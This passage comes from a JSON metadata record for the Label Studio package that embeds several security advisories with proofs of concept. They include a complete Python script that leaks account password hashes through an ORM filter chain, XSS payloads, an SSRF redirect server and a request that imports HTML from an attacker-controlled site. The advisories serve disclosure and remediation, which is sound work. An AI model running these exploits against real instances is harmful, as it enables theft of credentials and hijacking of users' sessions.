only_filtered(self, prepare_params=None):\n        request = prepare_params.request\n        queryset = TaskQuerySet(self.model).filter(project=prepare_params.project) <1>\n        fields_for_filter_ordering = get_fields_for_filter_ordering(prepare_params)\n        queryset = self.annotate_queryset(queryset, fields_for_evaluation=fields_for_filter_ordering, request=request)\n        return queryset.prepared(prepare_params=prepare_params)\n```\n1. Special Django method for the `models.Manager` class that is used to retrieve the queryset for querying objects of a model.\n2. Uses the vulnerable `TaskQuerySet` that was explained above.\n\nThe following code snippet of the `Task` model in [`label_studio/tasks/models.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/models.py#L49C1-L102C102) shows that the vulnerable `PreparedTaskManager` is set as a class variable, along with the `updated_by` relational mapping to a Django user that will be exploited as the entrypoint of the filter chain.\n\n```python\n# ...\nclass Task(TaskMixin, models.Model):\n    \"\"\" Business tasks from project\n    \"\"\"\n    id = models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID', db_index=True)\n\n    # ...\n\n    updated_by = models.ForeignKey(settings.AUTH_USER_MODEL, related_name='updated_tasks',\n        on_delete=models.SET_NULL, null=True, verbose_name=_('updated by'),\n        help_text='Last annotator or reviewer who updated this task') <1>\n\n    # ...\n\n    objects = TaskManager()  # task manager by default\n    prepared = PreparedTaskManager()  # task manager with filters, ordering, etc for data_manager app <2>\n\n    # ...\n```\n1. The entry point of the filter chain to filter by the `updated_by__active_organization__active_users__password`.\n2. The vulnerable `PreparedTaskManager` being set that will be exploited.\n\nFinally, the `TaskListAPI` view set in [`label_studio/tasks/api.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/api.py#L205) with the `/api/tasks` API endpoint uses the vulnerable `PreparedTaskManager` to filter `Task` objects.\n\n```python\n    def get_queryset(self):\n        task_id = self.request.parser_context['kwargs'].get('pk')\n        task = generics.get_object_or_404(Task, pk=task_id)\n        review = bool_from_request(self.request.GET, 'review', False)\n        selected = {\"all\": False, \"included\": [self.kwargs.get(\"pk\")]}\n        if review:\n            kwargs = {\n                'fields_for_evaluation': ['annotators', 'reviewed']\n            }\n        else:\n            kwargs = {'all_fields': True}\n        project = self.request.query_params.get('project') or self.request.data.get('project')\n        if not project:\n            project = task.project.id\n        return self.prefetch(\n            Task.prepared.get_queryset(\n                prepare_params=PrepareParams(project=project, selectedItems=selected, request=self.request),\n                **kwargs\n            )) <1>\n```\n1. Uses the vulnerable `PreparedTaskManager` to filter objects.\n\n# Proof of Concept\n\nBelow are the steps to exploit about how to exploit this vulnerability to leak the password hash of an account on Label Studio.\n\n1. Create two accounts on Label Studio and choose one account to be the victim and the other the hacker account that you will use.\n2. Create a new project or use an existing project, then add a task to the project. Update the task with the hacker account to cause the entry point of the filter chain.\n3. Navigate to the task view for the project and add any filter with the `Network` inspect tab open on the browser. Look for a `PATCH` request to `/api/dm/views/{view_id}?interaction=filter&project={project_id}` and save the `view_id` and `project_id` for the next step.\n4. Download the attached proof of concept exploit script named `labelstudio_ormleak.py`. This script will leak the password hash of the victim account character by character. Run the following command to run the exploit script, replacing the `{view_id}`, `{project_id}`, `{cookie_str}` and `{url}` with the corresponding values. For further explanation run `python3 labelstudio_ormleak.py --help`.\n\n```bash\npython3 labelstudio_ormleak.py -v {view_id} -p {project_id} -c '{cookie_str}' -u '{url}'\n```\n\nThe following example GIF demonstrates exploiting this ORM Leak vulnerability to retrieve the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=`.\n\n![labelstudio_ormleak_poc](https://user-images.githubusercontent.com/139727151/266986646-a3d1367c-fb4d-4482-9b6a-18a5d7316385.gif)\n\n# Impact\n\nThis vulnerability can be exploited to completely compromise the confidentiality of highly sensitive account information, such as account password hashes. For all versions `<=1.8.1`, this finding can also be chained with hard coded `SECRET_KEY` to forge session tokens of any user on Label Studio and could be abuse to deteriorate the integrity and availability.\n\n# Remediation Advice\n\n* Do not use unsanitised values for constructing a filter for querying objects using Django's ORM. Django's ORM allows querying by relation field and performs auto lookups, that enable filtering by sensitive fields.\n* Validate filter values to an allow list before performing any queries.\n\n# Discovered\n- August 2023, Alex Brown, elttam\n\n---\n# `labelstudio_ormleak.py` proof of concept\n\n```py\nimport argparse\nimport re\nimport requests\nimport string\nimport sys\n\n# Password hash characters\nCHARS = string.ascii_letters + string.digits + '$/+=_!'\nCHARS_LEN = len(CHARS)\n\nPAYLOAD = {\n    \"data\": {\n        \"columnsDisplayType\": {},\n        \"columnsWidth\": {},\n        \"filters\": {\n            \"conjunction\": \"and\",\n            \"items\": [\n                {\n                    \"filter\": \"filter:tasks:updated_by__active_organization__active_users__password\", # ORM Leak filter chain\n                    \"operator\": \"regex\", # Use regex operator to filter password hash value\n                    \"type\": \"String\",\n                    \"value\": \"REPLACEME\"\n                }\n            ]\n        },\n        \"gridWidth\": 4,\n        \"hiddenColumns\":{\"explore\":[\"tasks:inner_id\"],\"labeling\":[\"tasks:id\",\"tasks:inner_id\"]},\n        \"ordering\": [],\n        \"search_text\": None,\n        \"target\": \"tasks\",\n        \"title\": \"Default\",\n        \"type\": \"list\"\n    },\n    \"id\": 1, # View ID\n    \"project\": \"1\" # Project ID\n}\n\ndef parse_args() -> argparse.Namespace:\n    parser = argparse.ArgumentParser(\n        description='Leak an accounts password hash by exploiting a ORM Leak vulnerability in Label Studio'\n    )\n\n    parser.add_argument(\n        '-v', '--view-id',\n        help='View id of the page',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-p', '--project-id',\n        help='Project id to filter tasks for',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-c', '--cookie-str',\n        help='Cookie string for authentication',\n        required=True\n    )\n\n    parser.add_argument(\n        '-u', '--url',\n        help='Base URL to Label Studio instance',\n        required=True\n    )\n\n    return parser.parse_args()\n\ndef setup() -> dict:\n    args = parse_args()\n    view_id = args.view_id\n    project_id = args.project_id\n    path_1 = \"/api/dm/views/{view_id}?interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    path_2 = \"/api/tasks?page=1&page_size=1&view={view_id}&interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    PAYLOAD[\"id\"] = view_id\n    PAYLOAD[\"project\"] = str(project_id)\n    \n    config_dict = {\n        'COOKIE_STR': args.cookie_str,\n        'URL_PATH_1': args.url + path_1,\n        'URL_PATH_2': args.url + path_2,\n        'PAYLOAD': PAYLOAD\n    }\n    return config_dict\n\ndef test_payload(config_dict: dict, payload) -> bool:\n    sys.stdout.flush()\n    cookie_str = config_dict[\"COOKIE_STR\"]\n    r_set = requests.patch(\n        config_dict[\"URL_PATH_1\"],\n        json=payload,\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_listen = requests.get(\n        config_dict['URL_PATH_2'],\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_json = r_listen.json()\n    return len(r_json[\"tasks\"]) >= 1\n\ndef test_char(config_dict, known_hash, c):\n    json_payload_suffix = PAYLOAD\n    test_escaped = re.escape(known_hash + c)\n    json_payload_suffix[\"data\"][\"filters\"][\"items\"][0][\"value\"] =  f\"^{test_escaped}\"\n\n    suffix_result = test_payload(config_dict, json_payload_suffix)\n    if suffix_result:\n        return (known_hash + c, c)\n    \n    return None\n\ndef main():\n    config_dict = setup()\n    # By default Label Studio password hashes start with these characters\n    known_hash = \"pbkdf2_sha256$260000$\"\n    print()\n    print(f\"dumped: {known_hash}\", end=\"\")\n    sys.stdout.flush()\n\n    while True:\n        found = False\n\n        for c in CHARS:\n            r = test_char(config_dict, known_hash, c)\n            if not r is None:\n                new_hash, c = r\n                known_hash = new_hash\n                print(c, end=\"\")\n                sys.stdout.flush()\n                found = True\n                break\n\n        if not found:\n            break\n\n    print()\n\nif __name__ == \"__main__\":\n    main()\n```","fixed_in":["1.9.2.post0"],"id":"GHSA-6hjj-gq77-j4qw","link":"https://osv.dev/vulnerability/GHSA-6hjj-gq77-j4qw","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-26152"],"details":"### Summary\nOn all Label Studio versions prior to 1.11.0, data imported via file upload feature is not properly sanitized prior to being rendered within a [`Choices`](https://labelstud.io/tags/choices) or [`Labels`](https://labelstud.io/tags/labels) tag, resulting in an XSS vulnerability.\n\n### Details\nNeed permission to use the \"data import\" function. This was reproduced on Label Studio 1.10.1.\n\n### PoC\n\n1. Create a project.\n![Create a project](https://github.com/HumanSignal/label-studio/assets/3943358/9b1536ad-feac-4238-a1bd-ca9b1b798673)\n\n2. Upload a file containing the payload using the \"Upload Files\" function.\n![2  Upload a file containing the payload using the Upload Files function](https://github.com/HumanSignal/label-studio/assets/3943358/26bb7af1-1cd2-408f-9adf-61e31a5b7328)\n![3  complete](https://github.com/HumanSignal/label-studio/assets/3943358/f2f62774-1fa6-4456-9e6f-8fa1ca0a2d2e)\n\nThe following are the contents of the files used in the PoC\n```\n{\n  \"data\": {\n    \"prompt\": \"labelstudio universe image\",\n    \"images\": [\n      {\n        \"value\": \"id123#0\",\n        \"style\": \"margin: 5px\",\n        \"html\": \"<img width='400' src='https://labelstud.io/_astro/images-tab.64279c16_ZaBSvC.avif' onload=alert(document.cookie)>\"\n      }\n    ]\n  }\n}\n```\n\n3. Select the text-to-image generation labeling template of Ranking and scoring\n![3  Select the text-to-image generation labelling template for Ranking and scoring](https://github.com/HumanSignal/label-studio/assets/3943358/f227f49c-a718-4738-bc2a-807da4f97155)\n![5  save](https://github.com/HumanSignal/label-studio/assets/3943358/9b529f8a-8e99-4bb0-bdf6-bb7a95c9b75d)\n\n4. Select a task\n![4  Select a task](https://github.com/HumanSignal/label-studio/assets/3943358/71856b7a-2b1f-44ea-99ab-fc48bc20caa7)\n\n5. Check that the script is running\n![5  Check that the script is running](https://github.com/HumanSignal/label-studio/assets/3943358/e396ae7b-a591-4db7-afe9-5bab30b48cb9)\n\n### Impact\nMalicious scripts can be injected into the code, and when linked with vulnerabilities such as CSRF, it can cause even greater damage. In particular, It can become a source of further attacks, especially when linked to social engineering.\n","fixed_in":["1.11.0"],"id":"GHSA-6xv9-957j-qfhg","link":"https://osv.dev/vulnerability/GHSA-6xv9-957j-qfhg","source":"osv","summary":null,"withdrawn":null}]},"1.9.0":{"info":{"author":"Heartex","author_email":"hello@heartex.ai","bugtrack_url":null,"classifiers":["License :: OSI Approved :: Apache Software License","Operating System :: OS Independent","Programming Language :: Python :: 3"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"https://github.com/heartexlabs/label-studio","keywords":"","license":"","maintainer":"","maintainer_email":"","name":"label-studio","package_url":"https://pypi.org/project/label-studio/","platform":null,"project_url":"https://pypi.org/project/label-studio/","project_urls":{"Homepage":"https://github.com/heartexlabs/label-studio"},"provides_extra":null,"release_url":"https://pypi.org/project/label-studio/1.9.0/","requires_dist":["wheel (<=0.40.0,>=0.38.1)","appdirs (>=1.4.3)","attr (==0.3.1)","attrs (>=19.2.0)","pyyaml (>=5.3.1)","azure-storage-blob (>=12.6.0)","boto (~=2.49.0)","boto3 (~=1.16.28)","botocore (~=1.19.28)","bleach (~=5.0.0)","google-api-core (==2.11.0)","google-auth (==2.14.1)","google-cloud-appengine-logging (==1.1.0)","google-cloud-audit-log (==0.2.0)","google-cloud-core (==2.3.2)","google-cloud-storage (~=2.5.0)","google-cloud-logging (~=2.7.0)","google-resumable-media (==2.3.3)","googleapis-common-protos (==1.56.4)","grpc-google-iam-v1 (==0.12.4)","Django (==3.2.20)","django-storages (==1.12.3)","django-annoying (==0.10.6)","django-debug-toolbar (==3.2.1)","django-environ (==0.10.0)","django-filter (==2.4.0)","django-model-utils (==4.1.1)","django-rq (==2.5.1)","django-cors-headers (==3.6.0)","django-extensions (==3.1.0)","django-user-agents (==0.4.0)","django-ranged-fileresponse (>=0.1.2)","drf-dynamic-fields (==0.3.0)","djangorestframework (==3.13.1)","drf-flex-fields (==0.9.5)","humansignal-drf-yasg","drf-generators (==0.3.0)","htmlmin (==0.1.12)","jsonschema (==3.2.0)","lockfile (>=0.12.0)","lxml (>=4.2.5)","defusedxml (>=0.7.1)","numpy (==1.24.3)","ordered-set (==4.0.2)","pandas (>=0.24.0)","protobuf (<4.0.0,>=3.15.5)","psycopg2-binary (==2.9.6)","pydantic (<=1.11.0,>=1.7.3)","python-dateutil (>=2.8.1)","pytz (~=2022.1)","requests (==2.31.0)","urllib3 (==1.26.16)","rq (==1.10.1)","rules (==2.2)","ujson (>=3.0.0)","xmljson (==0.2.0)","colorama (>=0.4.4)","boxing (>=0.1.4)","redis (~=3.5)","sentry-sdk (>=1.1.0)","launchdarkly-server-sdk (==7.5.0)","python-json-logger (==2.0.4)","label-studio-converter (==0.0.55)","mysqlclient ; extra == 'mysql'"],"requires_python":">=3.6","summary":"Label Studio annotation tool","version":"1.9.0","yanked":false,"yanked_reason":null},"last_serial":25820833,"urls":[{"comment_text":"","digests":{"blake2b_256":"5cead612a1806ac4f36ab8742c61e640192273d7954c2258e2e2eaed49b2ac95","md5":"b8eee84b1108c8f749d6d9e984092294","sha256":"c45fa564f0b2a3f6629d333d2bd45c0d37365577d32d2e22ceb249cdce0a299e"},"downloads":-1,"filename":"label_studio-1.9.0-py3-none-any.whl","has_sig":false,"md5_digest":"b8eee84b1108c8f749d6d9e984092294","packagetype":"bdist_wheel","python_version":"py3","requires_python":">=3.6","size":57747402,"upload_time":"2023-09-27T23:49:59","upload_time_iso_8601":"2023-09-27T23:49:59.081053Z","url":"https://files.pythonhosted.org/packages/5c/ea/d612a1806ac4f36ab8742c61e640192273d7954c2258e2e2eaed49b2ac95/label_studio-1.9.0-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"5b17ab7cca931d1df6eec4de7656850a281593d2009e1061efdbe167a73766cf","md5":"fcb06cbc0ebae514a449745be42b8f38","sha256":"39d4c7f05fbdf502d9e21c1c5d8c20e75ef6fec788ec0ae88fd60370c51080ac"},"downloads":-1,"filename":"label-studio-1.9.0.tar.gz","has_sig":false,"md5_digest":"fcb06cbc0ebae514a449745be42b8f38","packagetype":"sdist","python_version":"source","requires_python":">=3.6","size":56621241,"upload_time":"2023-09-27T23:50:03","upload_time_iso_8601":"2023-09-27T23:50:03.979703Z","url":"https://files.pythonhosted.org/packages/5b/17/ab7cca931d1df6eec4de7656850a281593d2009e1061efdbe167a73766cf/label-studio-1.9.0.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2023-47116"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to [`1.11.0`](https://github.com/HumanSignal/label-studio/releases/tag/1.11.0) and was tested on version `1.8.2`.\n\n# Overview\n\nLabel Studio's SSRF protections that can be enabled by setting the `SSRF_PROTECTION_ENABLED` environment variable can be bypassed to access internal web servers. This is because the current SSRF validation is done by executing a single DNS lookup to verify that the IP address is not in an excluded subnet range. This protection can be bypassed by either using HTTP redirection or performing a [DNS rebinding attack](https://en.wikipedia.org/wiki/DNS_rebinding).\n\n# Description\n\nThe following `tasks_from_url` method in [`label_studio/data_import/uploader.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_import/uploader.py#L127-L155) performs the SSRF validation (`validate_upload_url`) before sending the request.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1]\n\n        validate_upload_url(url, block_local_urls=settings.SSRF_PROTECTION_ENABLED)\n        # Reason for #nosec: url has been validated as SSRF safe by the\n        # validation check above.\n        response = requests.get(\n            url, verify=False, headers={'Accept-Encoding': None}\n        )  # nosec\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(\n            user, project, SimpleUploadedFile(filename, file_content)\n        )\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(\n            project, file_upload_ids\n        )\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n\nThe `validate_upload_url` code in [`label_studio/core/utils/io.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/core/utils/io.py#L174-L209) is shown below.\n\n```python\ndef validate_upload_url(url, block_local_urls=True):\n    \"\"\"Utility function for defending against SSRF attacks. Raises\n        - InvalidUploadUrlError if the url is not HTTP[S], or if block_local_urls is enabled\n          and the URL resolves to a local address.\n        - LabelStudioApiException if the hostname cannot be resolved\n\n    :param url: Url to be checked for validity/safety,\n    :param block_local_urls: Whether urls that resolve to local/private networks should be allowed.\n    \"\"\"\n\n    parsed_url = parse_url(url)\n\n    if parsed_url.scheme not in ('http', 'https'):\n        raise InvalidUploadUrlError\n\n    domain = parsed_url.host\n    try:\n        ip = socket.gethostbyname(domain)\n    except socket.error:\n        from core.utils.exceptions import LabelStudioAPIException\n        raise LabelStudioAPIException(f\"Can't resolve hostname {domain}\")\n\n    if not block_local_urls:\n        return\n\n    if ip == '0.0.0.0':  # nosec\n        raise InvalidUploadUrlError\n    local_subnets = [\n        '127.0.0.0/8',\n        '10.0.0.0/8',\n        '172.16.0.0/12',\n        '192.168.0.0/16',\n    ]\n    for subnet in local_subnets:\n        if ipaddress.ip_address(ip) in ipaddress.ip_network(subnet):\n            raise InvalidUploadUrlError\n```\n\nThe issue here is the SSRF validation is only performed before the request is sent, and does not validate the destination IP address. Therefore, an attacker can either redirect the request or perform a DNS rebinding attack to bypass this protection.\n\n# Proof of Concept\n\nBoth the HTTP redirection and DNS rebinding methods for bypassing Label Studio's SSRF protections are explained below.\n\n### HTTP Redirection\n\nThe python `requests` module automatically follows HTTP redirects (eg. response code `301` and `302`). Therefore, an attacker could use a URL shortener (eg. `https://www.shorturl.at/`) or host the following Python code on an external server to redirect request from a Label Studio server to an internal web server.\n\n```python\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\n\nclass RedirectHandler(BaseHTTPRequestHandler):\n\n    def do_GET(self):\n        self.send_response(301)\n        # skip first slash\n        self.send_header('Location', self.path[1:])\n        self.end_headers()\n\nHTTPServer((\"\", 8080), RedirectHandler).serve_forever()\n```\n\n### DNS Rebinding Attack\n\nDNS rebinding can bypass SSRF protections by resolving to an external IP address for the first resolution, but when the request is sent resolves to an internal IP address that is blocked. For an example, the domain `7f000001.030d1fd6.rbndr.us` will randomly switch between the IP address `3.13.31.214` that is not blocked to `127.0.0.1` which is not allowed.\n\n# Impact\n\nSSRF vulnerabilities pose a significant risk on cloud environments, since instance credentials are managed by internal web APIs. An attacker can bypass Label Studio's SSRF protections to access internal web servers and partially compromise the confidentiality of those internal servers.\n\n# Remediation Advice\n\n* Before saving any responses, validate the destination IP address is not in the deny list.\n* Consider blocking internal cloud API IP ranges to mitigate the risk of compromising cloud credentials.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.11.0"],"id":"GHSA-p59w-9gqw-wj8r","link":"https://osv.dev/vulnerability/GHSA-p59w-9gqw-wj8r","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47115"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2` and was tested on version `1.8.2`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) has a cross-site scripting (XSS) vulnerability that could be exploited when an authenticated user uploads a crafted image file for their avatar that gets rendered as a HTML file on the website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/functions.py#L18-L49) shows that the only verification check is that the file is an image by extracting the dimensions from the file.\n\n```python\n\ndef hash_upload(instance, filename):\n    filename = str(uuid.uuid4())[0:8] + '-' + filename\n    return settings.AVATAR_PATH + '/' + filename <3>\n\n\ndef check_avatar(files):\n    images = list(files.items())\n    if not images:\n        return None\n\n    filename, avatar = list(files.items())[0]  # get first file\n    w, h = get_image_dimensions(avatar) <1>\n    if not w or not h:\n        raise forms.ValidationError(\"Can't read image, try another one\")\n\n    # validate dimensions\n    max_width = max_height = 1200\n    if w > max_width or h > max_height:\n        raise forms.ValidationError('Please use an image that is %s x %s pixels or smaller.'\n                                    % (max_width, max_height))\n\n    # validate content type\n    main, sub = avatar.content_type.split('/') <2>\n    if not (main == 'image' and sub.lower() in ['jpeg', 'jpg', 'gif', 'png']):\n        raise forms.ValidationError(u'Please use a JPEG, GIF or PNG image.')\n\n    # validate file size\n    max_size = 1024 * 1024\n    if len(avatar) > max_size:\n        raise forms.ValidationError('Avatar file size may not exceed ' + str(max_size/1024) + ' kb')\n\n    return avatar\n```\n1. Attempts to get image dimensions to validate the uploaded avatar file is an image.\n2. Extracts the `Content-Type` from the upload `POST` request. A user can easily bypass this verification by changing the mimetype of the uploaded file to an allowed type (eg. `image/jpeg`).\n3. The file extension of the uploaded file is never validated and is saved to the filesystem.\n\n[Label Studio serves avatar images using Django's built-in `serve` view](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/urls.py#L25-L26), which is [not secure for production use according to Django's documentation](https://docs.djangoproject.com/en/4.2/ref/views/#serving-files-in-development).\n\n```python\n    re_path(r'^data/' + settings.AVATAR_PATH + '/(?P<path>.*)$', serve,\n            kwargs={'document_root': join(settings.MEDIA_ROOT, settings.AVATAR_PATH)}),\n```\n\nThe issue with the Django `serve` view is that it determines the `Content-Type` of the response by the file extension in the URL path. Therefore, an attacker can upload an image that contains malicious HTML code and name the file with a `.html` extension to be rendered as a HTML page. The only file extension validation is performed on the client-side, which can be easily bypassed.\n\n# Proof of Concept\n\nBelow are the steps to reproduce this issue and execute JavaScript code in the context of the Label Studio website.\n\n1. Using any JPEG or PNG image, add in the comment field in the metadata the HTML code `<script>alert(document.domain)</script>`. This can be done using the `exiftool` command as shown below that was used to create the following image.\n\n```bash\nexiftool -Comment='<script>alert(document.domain)</script>' penguin.jpg\n```\n\n![xss-penguin](https://user-images.githubusercontent.com/139727151/266989884-c2cd9b4f-f374-416e-a468-acf41f52e088.jpg)\n\n2. On Label Studio, navigate to account & settings page and intercept the upload request of the avatar image using a tool such as Burp Suite. Modify the filename in the request to have a `.html` extension.\n\n3. Right click the image on the avatar profile and copy the URL. Send this to a victim and it will display an alert box with the host name of the Label Studio instance as shown below.\n\n![xss-alert](https://user-images.githubusercontent.com/139727151/266989952-6fb74c6e-9961-447c-a602-5a6f36627ae6.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* Validate the file extension on the server side, not in client-side code.\n* Remove the use of Django's `serve` view and implement a secure controller for viewing uploaded avatar images.\n* Consider saving file content in the database rather than on the filesystem to mitigate against other file related vulnerabilities.\n* Avoid trusting user controlled inputs.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.9.2"],"id":"GHSA-q68h-xwq5-mm7x","link":"https://osv.dev/vulnerability/GHSA-q68h-xwq5-mm7x","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-23633"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.10.1` and was tested on version `1.9.2.post0`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) had a remote import feature allowed users to import data from a remote web source, that was downloaded and could be viewed on the website. This feature could had been abused to download a HTML file that executed malicious JavaScript code in the context of the Label Studio website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/uploader.py#L125C5-L146) showed that is a URL passed the SSRF verification checks, the contents of the file would be downloaded using the filename in the URL.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1] <1>\n\n        response = ssrf_safe_get(\n            url, verify=project.organization.should_verify_ssl_certs(), stream=True, headers={'Accept-Encoding': None}\n        )\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(user, project, SimpleUploadedFile(filename, file_content))\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(project, file_upload_ids)\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n1. The file name that was set was retrieved from the URL.\n\nThe downloaded file path could then be retrieved by sending a request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]` where `{project_id}` was the ID of the project and `{download_id}` was the ID of the downloaded file. Once the downloaded file path was retrieved by the previous API endpoint, the [following code snippet](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/api.py#L595C1-L616C62) demonstrated that the `Content-Type` of the response was determined by the file extension, since `mimetypes.guess_type` guesses the `Content-Type` based on the file extension.\n\n```python\nclass UploadedFileResponse(generics.RetrieveAPIView):\n    permission_classes = (IsAuthenticated,)\n\n    @swagger_auto_schema(auto_schema=None)\n    def get(self, *args, **kwargs):\n        request = self.request\n        filename = kwargs['filename']\n        # XXX needed, on windows os.path.join generates '\\' which breaks FileUpload\n        file = settings.UPLOAD_DIR + ('/' if not settings.UPLOAD_DIR.endswith('/') else '') + filename\n        logger.debug(f'Fetch uploaded file by user {request.user} => {file}')\n        file_upload = FileUpload.objects.filter(file=file).last()\n\n        if not file_upload.has_permission(request.user):\n            return Response(status=status.HTTP_403_FORBIDDEN)\n\n        file = file_upload.file\n        if file.storage.exists(file.name):\n            content_type, encoding = mimetypes.guess_type(str(file.name)) <1>\n            content_type = content_type or 'application/octet-stream'\n            return RangedFileResponse(request, file.open(mode='rb'), content_type=content_type)\n        else:\n            return Response(status=status.HTTP_404_NOT_FOUND)\n```\n1. Determines the `Content-Type` based on the extension of the uploaded file by using `mimetypes.guess_type`.\n\nSince the `Content-Type` was determined by the file extension of the downloaded file, an attacker could import in a `.html` file that would execute JavaScript when visited.\n\n# Proof of Concept\n\nBelow were the steps to recreate this issue:\n\n1. Host the following HTML proof of concept (POC) script on an external website with the file extension `.html` that would be downloaded to the Label Studio website.\n\n```html\n<html>\n    <body>\n        <h1>Data Import XSS</h1>\n        <script>\n            alert(document.domain);\n        </script>\n    </body>\n</html>\n```\n\n2. Send the following `POST` request to download the HTML POC to the Label Studio and note the returned ID of the downloaded file in the response. In the following POC the `{victim_host}` is the address and port of the victim Label Studio website (eg. `labelstudio.com:8080`), `{project_id}` is the ID of the project where the data would be imported into, `{cookies}` are session cookies and `{evil_site}` is the website hosting the malicious HTML file (named `xss.html` in the following example).\n\n```http\nPOST /api/projects/{project_id}/import?commit_to_project=false HTTP/1.1\nHost: {victim_host}\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\ncontent-type: application/x-www-form-urlencoded\nContent-Length: 43\nConnection: close\nCookie: {cookies}\nPragma: no-cache\nCache-Control: no-cache\n\nurl=https://{evil_site}/xss.html\n```\n\n3. To retrieve the downloaded file path could be retrieved by sending a `GET` request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]`, where `{download_id}` is the ID of the file download from the previous step.\n\n4. Send your victim a link to `/data/{file_path}`, where `{file_path}` is the path of the downloaded file from the previous step. The following screenshot demonstrated executing the POC JavaScript code by visiting `/data/upload/1/cfcfc340-xss.html`.\n\n![xss-import-alert](https://user-images.githubusercontent.com/139727151/282223222-d8f9132c-838e-4aa6-9c03-a2bc83b4a409.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* For all user provided files that are downloaded by Label Studio, set the `Content-Security-Policy: sandbox;` response header when viewed on the site. The `sandbox` directive restricts a page's actions to prevent popups, execution of plugins and scripts and enforces a `same-origin` policy ([documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox)).\n* Restrict the allowed file extensions that could be downloaded.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.10.1"],"id":"GHSA-fq23-g58m-799r","link":"https://osv.dev/vulnerability/GHSA-fq23-g58m-799r","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47117"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2post0` and was tested on version `1.8.2`.\n\n# Overview\n\nIn all current versions of [Label Studio](https://github.com/HumanSignal/label-studio), the application allows users to insecurely set filters for filtering tasks. An attacker can construct a *filter chain* to filter tasks based on sensitive fields for all user accounts on the platform by exploiting Django's Object Relational Mapper (ORM). Since the results of query can be manipulated by the ORM filter, an attacker can leak these sensitive fields character by character. For an example, the following filter chain 